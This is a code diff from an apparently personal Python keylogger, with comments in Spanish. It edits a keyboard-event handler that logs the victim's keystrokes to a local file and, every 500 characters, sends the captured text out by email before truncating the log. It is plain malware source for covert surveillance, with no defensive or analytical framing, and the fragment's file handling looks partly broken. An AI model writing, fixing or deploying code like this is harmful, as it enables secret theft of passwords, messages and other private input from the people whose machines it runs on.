@@ -71,11 +71,11 @@ def OnKeyboardEvent(event):
         #abre el archivo 
         f=open("C:\Users\juan camilo\Documents\CODIGO\python\keylogger\datos.txt","r+")
         buffer=f.read()       
-           
+        f.close() 
         if  count == 500: 
             #Envia los ultimos 500 caracteres
-            capturado = buffer[-500:].replace("\n","")
-            f.seek(0)
+            capturado = buffer[-500:]
+            f=open("C:\Users\juan camilo\Documents\CODIGO\python\keylogger\datos.txt","w")
             f.truncate()
             f.close() 
             send_email(capturado)
@@ -91,7 +91,7 @@ def OnKeyboardEvent(event):
  
         #si se preciona ESPACIO 
         if event.Ascii==32:
-            keylogs=''
+            keylogs=' '
  
         buffer+=keylogs
         f.write(buffer)
